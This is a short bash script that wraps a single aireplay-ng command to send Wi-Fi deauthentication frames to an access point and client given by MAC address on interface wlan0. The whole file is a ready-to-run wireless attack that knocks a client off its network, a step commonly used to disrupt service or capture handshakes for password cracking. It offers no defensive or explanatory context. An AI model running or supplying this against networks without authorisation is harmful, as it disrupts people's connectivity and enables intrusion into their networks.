#!/bin/bash

# 1 = Mac Address of target
# 2 = Mac Address of client
aireplay-ng --deauth 4 -a $1 -c $2 wlan0
